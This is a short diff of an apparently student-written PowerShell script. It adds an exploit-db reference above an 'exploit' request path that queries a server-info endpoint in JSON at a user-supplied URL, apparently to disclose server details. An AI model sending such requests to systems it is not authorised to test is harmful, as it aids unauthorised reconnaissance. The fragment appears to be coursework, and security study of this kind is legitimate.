@@ -30,6 +30,7 @@ Student ID: PSP-3223
 param ([parameter (Mandatory = $true)][string]$URL)
 
 #exploit
+#https://www.exploit-db.com/exploits/44865
 $exploit = "/__raw/services/server/info/server-info?output_mode=json"
 
 #set the full URL with Exploit 
